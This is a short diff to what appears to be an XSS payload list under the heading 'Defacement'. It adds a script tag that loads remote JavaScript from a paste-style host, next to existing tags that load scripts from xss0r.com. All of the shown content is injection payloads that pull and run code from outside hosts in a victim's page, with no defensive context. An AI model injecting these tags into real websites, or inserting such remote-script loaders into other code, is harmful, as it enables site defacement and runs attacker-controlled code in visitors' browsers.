@@ -3,7 +3,7 @@ Defacement:
 ==========
 <script src="https://xss0r.com/Resources/xss0r.js"></script>
 <script src="https://xss0r.com/Resources/xss0r1.js"></script>
-
+<script src="https://jso-tools.z-x.my.id/raw/~/RD9CXXDM006AY"></script>
 
 https://xss.js.org/#/
 
